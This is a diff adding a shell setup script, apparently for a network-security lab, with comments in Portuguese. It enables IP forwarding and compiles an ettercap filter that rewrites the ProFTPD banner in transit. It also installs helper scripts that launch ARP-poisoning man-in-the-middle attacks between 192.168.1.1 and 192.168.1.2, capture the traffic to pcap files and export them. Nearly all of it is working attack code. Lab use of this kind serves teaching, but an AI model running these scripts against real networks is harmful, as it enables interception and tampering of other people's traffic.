@@ -1,0 +1,64 @@
+/etc/init.d/networking restart
+
+# Necessário para encaminhar tráfego entre vítima e servidor durante o ataque.
+echo 1 > /proc/sys/net/ipv4/ip_forward
+
+# Filtro de demonstração para alterar o banner do ProFTPD em trânsito.
+cat > /root/pftp_filter.src <<'EOF'
+# Modifica o nome do servidor FTP
+if (tcp.src == 21 && search(DATA.data, "ProFTPD")) {
+replace("ProFTPD", "ProFTP Hacked!");
+}
+EOF
+
+etterfilter /root/pftp_filter.src -o /root/pftp_filter.fil >/tmp/etterfilter.log 2>&1
+
+cat > /usr/local/bin/start_mitm_capture.sh <<'EOF'
+#!/bin/sh
+set -eu
+
+ettercap -T -q -i eth0 \
+	-w /root/mitm.pcap \
+	-M arp:remote /192.168.1.1/ /192.168.1.2/ \
+	>/tmp/ettercap-mitm.log 2>&1 &
+
+echo $! > /tmp/ettercap-mitm.pid
+echo "MITM ativo (sem filtro). PID: $(cat /tmp/ettercap-mitm.pid)"
+echo "Arquivo de captura: /root/mitm.pcap"
+EOF
+chmod +x /usr/local/bin/start_mitm_capture.sh
+
+cat > /usr/local/bin/start_mitm_filter_capture.sh <<'EOF'
+#!/bin/sh
+set -eu
+
+ettercap -T -q -i eth0 \
+	-w /root/mitm_filter.pcap \
+	-F /root/pftp_filter.fil \
+	-M arp:remote /192.168.1.1/ /192.168.1.2/ \
+	>/tmp/ettercap-mitm-filter.log 2>&1 &
+
+echo $! > /tmp/ettercap-mitm-filter.pid
+echo "MITM ativo (com filtro). PID: $(cat /tmp/ettercap-mitm-filter.pid)"
+echo "Arquivo de captura: /root/mitm_filter.pcap"
+EOF
+chmod +x /usr/local/bin/start_mitm_filter_capture.sh
+
+cat > /usr/local/bin/stop_mitm_and_export.sh <<'EOF'
+#!/bin/sh
+set -eu
+
+if [ -f /tmp/ettercap-mitm.pid ]; then
+	kill "$(cat /tmp/ettercap-mitm.pid)" 2>/dev/null || true
+	rm -f /tmp/ettercap-mitm.pid
+fi
+
+if [ -f /tmp/ettercap-mitm-filter.pid ]; then
+	kill "$(cat /tmp/ettercap-mitm-filter.pid)" 2>/dev/null || true
+	rm -f /tmp/ettercap-mitm-filter.pid
+fi
+
+cp -f /root/mitm*.pcap /hosthome/ 2>/dev/null || true
+echo "Ataque encerrado e PCAPs exportados para /hosthome (se existirem)."
+EOF
+chmod +x /usr/local/bin/stop_mitm_and_export.sh
